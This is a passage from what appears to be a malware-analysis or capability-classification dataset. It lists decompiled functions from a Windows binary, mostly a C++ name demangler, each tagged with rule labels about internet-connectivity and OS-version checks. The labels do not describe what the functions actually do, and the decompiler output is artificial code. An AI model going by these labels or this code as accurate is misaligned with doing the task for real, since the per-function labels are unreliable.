0x4a:\n            case 0x4b:\n            case 0x4c:\n            case 0x4d:\n            case 0x4e:\n            case 0x4f:\n            case 0x50:\n            case 0x51:\n                arg2_00 = *(arg2 + 4);\n                goto code_r0x00014000aa74;\n            case 7:\n            case 8:\n            case 0x33:\n                arg2 = *(arg2 + 6);\n                break;\n            case 0x23:\n            case 0x24:\n                arg2_00 = *(arg2 + 4);\n                if (*arg2_00 == 5) {\n                    *(arg1 + 0x15c) = *(arg1 + 0x15c) + 1;\n                }\ncode_r0x00014000aa74:\n                *(arg1 + 0x134) = iVar1 + 1;\n                fcn.14000a9f0(arg1, arg2_00);\n                fcn.14000a9f0(arg1, *(arg2 + 6));\n                *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n                return;\n            case 0x2c:\n            case 0x45:\n            case 0x46:\n            case 0x47:\n            case 0x48:\n                arg2 = *(arg2 + 4);\n            }\n        } while (arg2 != NULL);\n    }\ncode_r0x00014000aa41:\n    return;\n}\n",
        "token_count": 915
    },
    "14000aac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.14000aac0(int32_t *arg1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (arg1 != NULL) {\n        do {\n            if (*arg1 != 0x2f) {\n                return iVar1;\n            }\n            if (*(arg1 + 4) == 0) {\n                return iVar1;\n            }\n            arg1 = *(arg1 + 6);\n            iVar1 = iVar1 + 1;\n        } while (arg1 != NULL);\n    }\n    return iVar1;\n}\n",
        "token_count": 125
    },
    "14000abf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.14000abf0(uint8_t *arg1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *arg1 - 0x4b;\n    if (uVar1 < 0x28) {\n        return (0xffffff7ffffff7feU >> (uVar1 & 0x3f) & 1) == 0;\n    }\n    if (*arg1 != 0x44) {\n        return false;\n    }\n    return arg1[1] + 0x89 < 2 || (arg1[1] & 0xdf) == 0x4f;\n}\n",
        "token_count": 140
    },
    "14000b0f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * fcn.14000b0f0(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int64_t iVar3;\n    char cVar4;\n    int32_t iVar5;\n    ulong arg4;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint *puVar10;\n    ulong uVar11;\n    int32_t iVar12;\n    char *pcVar13;\n    bool bVar14;\n    \n    pcVar13 = *(arg1 + 0x18);\n    if (*pcVar13 != 'S') {\n        return NULL;\n    }\n    *(arg1 + 0x18) = pcVar13 + 1;\n    cVar4 = pcVar13[1];\n    if (cVar4 == '\\0') {\ncode_r0x00014000b113:\n        uVar6 = *(arg1 + 0x10) & 8;\n        if (((uVar6 != 0) || ((arg2 & 1) == 0)) || (bVar14 = true,  1 < **(arg1 + 0x18) + 0xbdU)) {\n            bVar14 = uVar6 != 0;\n        }\n        pcVar13 = 0x14010cdc0;\n        while (*pcVar13 != cVar4) {\n            pcVar13 = pcVar13 + 0x38;\n            if (pcVar13 == 0x14010cf48) {\n                return NULL;\n            }\n        }\n        iVar3 = *(pcVar13 + 0x28);\n        iVar5 = *(arg1 + 0x28);\n        iVar1 = *(arg1 + 0x2c);\n        if (iVar3 != 0) {\n            uVar2 = *(pcVar13 + 0x30);\n            if (iVar5 < iVar1) {\n                iVar9 = iVar5;\n                iVar5 = iVar5 + 1;\n                puVar10 = iVar9 * 0x20 + *(arg1 + 0x20);\n                *(puVar10 + 1) = 0;\n                *(arg1 + 0x28) = iVar5;\n                *puVar10 = 0x18;\n                *(puVar10 + 4) = iVar3;\n                puVar10[6] = uVar2;\n            }\n            else {\n                puVar10 = NULL;\n            }\n            *(arg1 + 0x40) = puVar10;\n        }\n        if (bVar14) {\n            uVar11 = *(pcVar13 + 0x18);\n            iVar12 = *(pcVar13 + 0x20);\n        }\n        else {\n            uVar11 = *(pcVar13 + 8);\n            iVar12 = *(pcVar13 + 0x10);\n        }\n        *(arg1 + 0x48) = *(arg1 + 0x48) + iVar12;\n        if (iVar5 < iVar1) {\n            puVar10 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(puVar10 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *puVar10 = 0x18;\n            *(puVar10 + 4) = uVar11;\n            puVar10[6] = iVar12;\n        }\n        else {\n            puVar10 = NULL;\n        }\n        pcVar13 = *(arg1 + 0x18);\n        if (*pcVar13 == 'B') {\n            uVar11 = *(arg1 + 0x40);\n            do {\n                *(arg1 + 0x18) = pcVar13 + 1;\n                arg4 = fcn.14000aff0(arg1);\n                puVar10 = fcn.14000a670(arg1, 0x4d, puVar10, arg4);\n                pcVar13 = *(arg1 + 0x18);\n            } while (*pcVar13 == 'B');\n            *(arg1 + 0x40) = uVar11;\n            if (puVar10 == NULL) {\n                return NULL;\n            }\n            iVar5 = *(arg1 + 0x38);\n            if (*(arg1 + 0x3c) <= iVar5) {\n                return NULL;\n            }\n            *(*(arg1 + 0x30) + iVar5 * 8) = puVar10;\n            *(arg1 + 0x38) = iVar5 + 1;\n            return puVar10;\n        }\n        return puVar10;\n    }\n    *(arg1 + 0x18) = pcVar13 + 2;\n    cVar4 = pcVar13[1];\n    if ((cVar4 - 0x30U < 10) || (cVar4 == '_')) {\n        uVar8 = 0;\n        if (cVar4 == '_') goto code_r0x00014000b196;\n    }\n    else if (0x19 < cVar4 + 0xbfU) goto code_r0x00014000b113;\n    uVar6 = 0;\n    do {\n        if (cVar4 - 0x30U < 10) {\n            uVar7 = cVar4 + -0x30 + uVar6 * 0x24;\n        }\n        else {\n            if (0x19 < cVar4 + 0xbfU) {\n                return NULL;\n            }\n            uVar7 = cVar4 + -0x37 + uVar6 * 0x24;\n        }\n        if (uVar7 < uVar6) {\n            return NULL;\n        }\n        pcVar13 = *(arg1 + 0x18);\n        if (*pcVar13 == '\\0') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar13 + 1;\n        cVar4 = *pcVar13;\n        uVar6 = uVar7;\n    } while (cVar4 != '_');\n    uVar8 = uVar7 + 1;\ncode_r0x00014000b196:\n    if (*(arg1 + 0x38) <= uVar8) {\n        return NULL;\n    }\n    return *(*(arg1 + 0x30) + uVar8 * 8);\n}\n",
        "token_count": 1397
    },
    "14000b34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.14000b340(int64_t arg1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int64_t iVar7;\n    int32_t **ppiVar8;\n    ulong uVar9;\n    int64_t arg4;\n    uint8_t uVar10;\n    uint64_t uVar11;\n    char *arg2;\n    int32_t *piVar12;\n    uint *arg3;\n    char *pcVar13;\n    char *pcVar14;\n    char *pcVar15;\n    int32_t *apiStack64 [2];\n    \n    pcVar13 = *(arg1 + 0x18);\n    iVar5 = fcn.14000abf0(pcVar13);\n    if (iVar5 != 0) {\n        ppiVar8 = fcn.14000d470(arg1, apiStack64, 0);\n        if (ppiVar8 == NULL) {\n            return NULL;\n        }\n        if (**(arg1 + 0x18) == 'F') {\n            piVar12 = fcn.14000bf70(arg1);\n        }\n        else {\n            piVar12 = fcn.14000b340(arg1);\n        }\n        *ppiVar8 = piVar12;\n        if (piVar12 == NULL) {\n            return NULL;\n        }\n        if (*piVar12 - 0x1fU < 2) {\n            piVar3 = *(piVar12 + 4);\n            *(piVar12 + 4) = apiStack64[0];\n            apiStack64[0] = *ppiVar8;\n            *ppiVar8 = piVar3;\n        }\n        if (apiStack64[0] == NULL) {\n            return NULL;\n        }\n        iVar5 = *(arg1 + 0x38);\n        if (*(arg1 + 0x3c) <= iVar5) {\n            return NULL;\n        }\n        *(*(arg1 + 0x30) + iVar5 * 8) = apiStack64[0];\n        *(arg1 + 0x38) = iVar5 + 1;\n        return apiStack64[0];\n    }\n    cVar4 = *pcVar13;\n    if ('U' < cVar4) {\n        uVar10 = cVar4 + 0xa6;\n        if (0x20 < uVar10) {\n            return NULL;\n        }\n        uVar11 = 1 << (uVar10 & 0x3f);\n        if ((uVar11 & 0x1f63dff80) != 0) {\n            iVar7 = (cVar4 + -0x61) * 0x20;\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *(piVar12 + 4) = iVar7 + 0x14010d920;\n            iVar5 = *(iVar7 + 0x14010d928);\n            *piVar12 = 0x27;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + iVar5;\n            *(arg1 + 0x18) = pcVar13 + 1;\n            return piVar12;\n        }\n        if ((uVar11 & 1) != 0) goto code_r0x00014000b4d0;\n        if (uVar10 != 0x1b) {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar13 + 1;\n        uVar9 = fcn.14000aff0(arg1);\n        piVar12 = fcn.14000a670(arg1, 0x28, uVar9, 0);\n        apiStack64[0] = piVar12;\n        goto code_r0x00014000b4e0;\n    }\n    if (cVar4 < '0') {\n        return NULL;\n    }\n    // switch table (38 cases) at 0x14010c300\n    switch(cVar4 - 0x30U & 0xff) {\n    case 0:\n    case 1:\n    case 2:\n    case 3:\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 9:\n    case 0x1e:\ncode_r0x00014000b4d0:\n        piVar12 = fcn.14000dcb0(arg1);\n        apiStack64[0] = piVar12;\n        break;\n    default:\n        goto code_r0x00014000b428;\n    case 0x11:\n        arg2 = pcVar13 + 1;\n        *(arg1 + 0x18) = arg2;\n        if (pcVar13[1] == '_') {\n            iVar7 = 0;\n        }\n        else {\n            pcVar14 = arg2;\n            if (pcVar13[1] - 0x30U < 10) {\n                do {\n                    pcVar15 = pcVar14;\n                    pcVar14 = pcVar15 + 1;\n                    *(arg1 + 0x18) = pcVar14;\n                } while (*pcVar14 - 0x30U < 10);\n                iVar7 = fcn.14000a770(arg1, arg2, pcVar15 - pcVar13);\n                if (iVar7 == 0) {\n                    return NULL;\n                }\n                cVar4 = pcVar15[1];\n                arg2 = pcVar14;\n            }\n            else {\n                uVar6 = *(arg1 + 0x4c);\n                *(arg1 + 0x4c) = 1;\n                iVar7 = fcn.14000cbe0(arg1);\n                *(arg1 + 0x4c) = uVar6;\n                if (iVar7 == 0) {\n                    return NULL;\n                }\n                arg2 = *(arg1 + 0x18);\n                cVar4 = *arg2;\n            }\n            if (cVar4 != '_') {\n                return NULL;\n            }\n        }\n        *(arg1 + 0x18) = arg2 + 1;\n        uVar9 = fcn.14000b340(arg1);\n        piVar12 = fcn.14000a670(arg1, 0x2a, iVar7, uVar9);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x13:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        uVar9 = fcn.14000b340(arg1);\n        piVar12 = fcn.14000a670(arg1, 0x25, uVar9, 0);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x14:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        if (pcVar13[1] == '\\0') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar13 + 2;\n    // switch table (49 cases) at 0x14010c398\n        switch(pcVar13[1]) {\n        case 'F':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x2c;\n            cVar4 = pcVar13[2];\n            *(piVar12 + 6) = cVar4 - 0x30U < 10;\n            apiStack64[0] = piVar12;\n            if (cVar4 - 0x30U < 10) {\n                fcn.14000a7d0(arg1);\n            }\n            iVar7 = fcn.14000b340(arg1);\n            *(piVar12 + 4) = iVar7;\n            if (iVar7 == 0) {\n                return NULL;\n            }\n            fcn.14000a7d0(arg1);\n            pcVar13 = *(arg1 + 0x18);\n            cVar4 = *pcVar13;\n            if (cVar4 != '\\0') {\n                *(arg1 + 0x18) = pcVar13 + 1;\n                cVar4 = *pcVar13;\n            }\n            *(piVar12 + 0x1a) = cVar4 == 's';\n            return piVar12;\n        default:\n            return NULL;\n        case 'T':\n        case 't':\n            uVar6 = *(arg1 + 0x4c);\n            *(arg1 + 0x4c) = 1;\n            uVar9 = fcn.14000cbe0(arg1);\n            *(arg1 + 0x4c) = uVar6;\n            piVar12 = fcn.14000a670(arg1, 0x44, uVar9, 0);\n            if (piVar12 == NULL) {\n                return NULL;\n            }\n            pcVar13 = *(arg1 + 0x18);\n            if (*pcVar13 == '\\0') {\n                return NULL;\n            }\n            *(arg1 + 0x18) = pcVar13 + 1;\n            apiStack64[0] = piVar12;\n            if (*pcVar13 != 'E') {\n                return NULL;\n            }\n            goto code_r0x00014000b4e9;\n        case 'a':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                return NULL;\n            }\n            *(arg1 + 0x28) = iVar5 + 1;\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *piVar12 = 0;\n            *(piVar12 + 4) = \"auto\";\n            piVar12[6] = 4;\n            return piVar12;\n        case 'c':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                return NULL;\n            }\n            *(arg1 + 0x28) = iVar5 + 1;\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *piVar12 = 0;\n            *(piVar12 + 4) = \"decltype(auto)\";\n            piVar12[6] = 0xe;\n            return piVar12;\n        case 'd':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x14010dc80;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 9;\n            return piVar12;\n        case 'e':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x14010dca0;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 10;\n            return piVar12;\n        case 'f':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x14010dc60;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 9;\n            return piVar12;\n        case 'h':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x14010dcc0;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 4;\n            return piVar12;\n        case 'i':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x14010dd20;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 8;\n            return piVar12;\n        case 'n':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x14010dd40;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 0x11;\n            return piVar12;\n        case 'p':\n            uVar9 = fcn.14000b340(arg1);\n            piVar12 = fcn.14000a670(arg1, 0x4c, uVar9, 0);\n            apiStack64[0] = piVar12;\n            break;\n        case 's':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x14010dd00;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 8;\n            return piVar12;\n        case 'u':\n            iVar5 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar12 = iVar5 * 0x20 + *(arg1 + 0x20);\n            *(piVar12 + 1) = 0;\n            *(arg1 + 0x28) = iVar5 + 1;\n            *piVar12 = 0x27;\n            *(piVar12 + 4) = 0x14010dce0;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 7;\n            return piVar12;\n        case 'v':\n            if (pcVar13[2] == '_') {\n                uVar6 = *(arg1 + 0x4c);\n                *(arg1 + 0x4c) = 1;\n                *(arg1 + 0x18) = pcVar13 + 3;\n                arg3 = fcn.14000cbe0(arg1);\n                *(arg1 + 0x4c) = uVar6;\n                if (arg3 == NULL) {\n                    return NULL;\n                }\n            }\n            else {\n                iVar5 = *(arg1 + 0x28);\n                if (*(arg1 + 0x2c) <= iVar5) {\n                    return NULL;\n                }\n                arg3 = iVar5 * 0x20 + *(arg1 + 0x20);\n                *(arg3 + 1) = 0;\n                *(arg1 + 0x28) = iVar5 + 1;\n                *arg3 = 0x43;\n                uVar6 = fcn.14000a7d0(arg1);\n                arg3[4] = uVar6;\n            }\n            if (**(arg1 + 0x18) != '_') {\n                return NULL;\n            }\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            uVar9 = fcn.14000b340(arg1);\n            piVar12 = fcn.14000a670(arg1, 0x2d, arg3, uVar9);\n            apiStack64[0] = piVar12;\n        }\n        break;\n    case 0x16:\n        piVar12 = fcn.14000bf70(arg1);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x17:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        uVar9 = fcn.14000b340(arg1);\n        piVar12 = fcn.14000a670(arg1, 0x26, uVar9, 0);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x1d:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        iVar7 = fcn.14000b340(arg1);\n        if (iVar7 == 0) {\n            return NULL;\n        }\n        arg4 = fcn.14000b340(arg1);\n        if (arg4 == 0) {\n            return NULL;\n        }\n        piVar12 = fcn.14000a670(arg1, 0x2b, iVar7, arg4);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x1f:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        uVar9 = fcn.14000b340(arg1);\n        piVar12 = fcn.14000a670(arg1, 0x24, uVar9, 0);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x20:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        uVar9 = fcn.14000b340(arg1);\n        piVar12 = fcn.14000a670(arg1, 0x22, uVar9, 0);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x22:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        uVar9 = fcn.14000b340(arg1);\n        piVar12 = fcn.14000a670(arg1, 0x23, uVar9, 0);\n        apiStack64[0] = piVar12;\n        break;\n    case 0x23:\n        if ((pcVar13[1] - 0x30 < 0x30) && ((0xffff78000001fc00U >> (pcVar13[1] - 0x30 & 0x3f) & 1) == 0)) {\n            piVar12 = fcn.14000b0f0(arg1, 0);\n            if (**(arg1 + 0x18) != 'I') {\n                return piVar12;\n            }\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            apiStack64[0] = piVar12;\n            uVar9 = fcn.14000c950(arg1);\n            goto code_r0x00014000b61f;\n        }\n        piVar12 = fcn.14000dcb0(arg1);\n        if (piVar12 == NULL) {\n            return NULL;\n        }\n        apiStack64[0] = piVar12;\n        if (*piVar12 == 0x18) {\n            return piVar12;\n        }\n        goto code_r0x00014000b4e9;\n    case 0x24:\n        piVar12 = fcn.14000aeb0(arg1);\n        pcVar13 = *(arg1 + 0x18);\n        apiStack64[0] = piVar12;\n        if (*pcVar13 == 'I') {\n            if (*(arg1 + 0x50) == 0) {\n                if (piVar12 == NULL) {\n                    return NULL;\n                }\n                iVar5 = *(arg1 + 0x38);\n                if (*(arg1 + 0x3c) <= iVar5) {\n                    return NULL;\n                }\n                uVar9 = 0;\n                *(*(arg1 + 0x30) + iVar5 * 8) = piVar12;\n                *(arg1 + 0x38) = iVar5 + 1;\n                if (*pcVar13 + 0xb7U < 2) {\n                    *(arg1 + 0x18) = pcVar13 + 1;\n                    uVar9 = fcn.14000c950(arg1);\n                }\n            }\n            else {\n                uVar6 = *(arg1 + 0x28);\n                uVar1 = *(arg1 + 0x38);\n                *(arg1 + 0x18) = pcVar13 + 1;\n                uVar2 = *(arg1 + 0x48);\n                uVar9 = fcn.14000c950(arg1);\n                if (**(arg1 + 0x18) != 'I') {\n                    *(arg1 + 0x18) = pcVar13;\n                    *(arg1 + 0x28) = uVar6;\n                    *(arg1 + 0x38) = uVar1;\n                    *(arg1 + 0x48) = uVar2;\n                    break;\n                }\n                if (piVar12 == NULL) {\n                    return NULL;\n                }\n                iVar5 = *(arg1 + 0x38);\n                if (*(arg1 + 0x3c) <= iVar5) {\n                    return NULL;\n                }\n                *(*(arg1 + 0x30) + iVar5 * 8) = piVar12;\n                *(arg1 + 0x38) = iVar5 + 1;\n            }\ncode_r0x00014000b61f:\n            piVar12 = fcn.14000a670(arg1, 4, piVar12, uVar9);\n            apiStack64[0] = piVar12;\n        }\n        break;\n    case 0x25:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        piVar12 = fcn.14000aff0(arg1);\n        apiStack64[0] = piVar12;\n        if (**(arg1 + 0x18) == 'I') {\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            uVar9 = fcn.14000c950(arg1);\n            piVar12 = fcn.14000a670(arg1, 4, piVar12, uVar9);\n        }\n        uVar9 = fcn.14000b340(arg1);\n        piVar12 = fcn.14000a670(arg1, 0x21, uVar9, piVar12);\n        apiStack64[0] = piVar12;\n    }\ncode_r0x00014000b4e0:\n    if (piVar12 != NULL) {\ncode_r0x00014000b4e9:\n        iVar5 = *(arg1 + 0x38);\n        if (iVar5 < *(arg1 + 0x3c)) {\n            *(*(arg1 + 0x30) + iVar5 * 8) = piVar12;\n            *(arg1 + 0x38) = iVar5 + 1;\n            return apiStack64[0];\n        }\n    }\ncode_r0x00014000b428:\n    return NULL;\n}\n",
        "token_count": 5822
    },
    "14000be1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.14000be10(int64_t arg1)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    char *pcVar3;\n    int64_t *piVar4;\n    int64_t aiStack32 [2];\n    \n    aiStack32[0] = 0;\n    pcVar3 = *(arg1 + 0x18);\n    cVar1 = *pcVar3;\n    if ((cVar1 != 'E' && cVar1 != '\\0') && (piVar4 = aiStack32,  cVar1 != '.')) {\n        while (((cVar1 != 'R' && (cVar1 != 'O')) || (pcVar3[1] != 'E'))) {\n            iVar2 = fcn.14000b340(arg1);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            iVar2 = fcn.14000a670(arg1, 0x2e, iVar2, 0);\n            *piVar4 = iVar2;\n            if (iVar2 == 0) {\n                return 0;\n            }\n            pcVar3 = *(arg1 + 0x18);\n            piVar4 = iVar2 + 0x18;\n            cVar1 = *pcVar3;\n            if ((cVar1 == '\\0' || cVar1 == 'E') || (cVar1 == '.')) break;\n        }\n        if (aiStack32[0] != 0) {\n            if (*(aiStack32[0] + 0x18) != 0) {\n                return aiStack32[0];\n            }\n            if (**(aiStack32[0] + 0x10) == 0x27) {\n                iVar2 = *(*(aiStack32[0] + 0x10) + 4);\n                if (*(iVar2 + 0x1c) == 9) {\n                    *(arg1 + 0x48) = *(arg1 + 0x48) - *(iVar2 + 8);\n                    *(aiStack32[0] + 0x10) = 0;\n                    return aiStack32[0];\n                }\n                return aiStack32[0];\n            }\n            return aiStack32[0];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 501
    },
    "14000c1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.14000c1c0(int64_t arg1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t *arg3;\n    ulong arg4;\n    ulong uVar5;\n    int64_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    int32_t *piVar9;\n    char *pcVar10;\n    \n    pcVar7 = *(arg1 + 0x18);\n    cVar3 = *pcVar7;\n    if (cVar3 - 0x30U < 10) {\n        arg3 = fcn.14000aff0(arg1);\n        cVar3 = **(arg1 + 0x18);\n        pcVar8 = *(arg1 + 0x18);\n        goto joined_r0x00014000c325;\n    }\n    if (cVar3 + 0x9fU < 0x1a) {\n        uVar1 = *(arg1 + 0x4c);\n        if ((cVar3 == 'o') && (pcVar7[1] == 'n')) {\n            *(arg1 + 0x4c) = 0;\n            *(arg1 + 0x18) = pcVar7 + 2;\n        }\n        arg3 = fcn.14000c020(arg1);\n        *(arg1 + 0x4c) = uVar1;\n        if ((arg3 != NULL) && (*arg3 == 0x32)) {\n            pcVar7 = **(arg3 + 4);\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 7 + *(*(arg3 + 4) + 2);\n            if ((*pcVar7 == 'l') && ((pcVar7[1] == 'i' && (pcVar7[2] == '\\0')))) {\n                uVar5 = fcn.14000aff0(arg1);\n                arg3 = fcn.14000a670(arg1, 0x37, arg3, uVar5);\n            }\n        }\ncode_r0x00014000c20c:\n        cVar3 = **(arg1 + 0x18);\n        pcVar8 = *(arg1 + 0x18);\n        goto joined_r0x00014000c325;\n    }\n    if (cVar3 + 0xbdU < 2) {\n        piVar9 = *(arg1 + 0x40);\n        if ((piVar9 == NULL) || ((*piVar9 != 0 && (*piVar9 != 0x18)))) {\n            if (cVar3 != 'C') goto code_r0x00014000c43d;\n        }\n        else {\n            *(arg1 + 0x48) = piVar9[6] + *(arg1 + 0x48);\n            cVar3 = *pcVar7;\n            if (cVar3 != 'C') {\n                if (cVar3 != 'D') {\ncode_r0x00014000c47d:\n                    arg3 = NULL;\n                    pcVar8 = pcVar7;\n                    goto joined_r0x00014000c325;\n                }\ncode_r0x00014000c43d:\n                if (pcVar7[1] - 0x30U < 6) {\n    // switch table (6 cases) at 0x14010c45c\n                    switch(*((pcVar7[1] - 0x30U) * 4 + 0x14010c45c) + 0x14010c45c) {\n                    case 0x14000c484:\n                        iVar4 = 2;\n                        break;\n                    case 0x14000c4e0:\n                        iVar4 = 5;\n                        break;\n                    case 0x14000c4e7:\n                        iVar4 = 4;\n                        break;\n                    case 0x14000c4ee:\n                        iVar4 = 3;\n                        break;\n                    case 0x14000c4f5:\n                        iVar4 = 1;\n                        break;\n                    case 0x14000c4fc:\n                        goto code_r0x00014000c4fc;\n                    }\n                    pcVar8 = pcVar7 + 2;\n                    iVar2 = *(arg1 + 0x28);\n                    *(arg1 + 0x18) = pcVar8;\n                    if (iVar2 < *(arg1 + 0x2c)) {\n                        arg3 = iVar2 * 0x20 + *(arg1 + 0x20);\n                        *(arg3 + 1) = 0;\n                        *(arg1 + 0x28) = iVar2 + 1;\n                        if (piVar9 != NULL) {\n                            *(arg3 + 1) 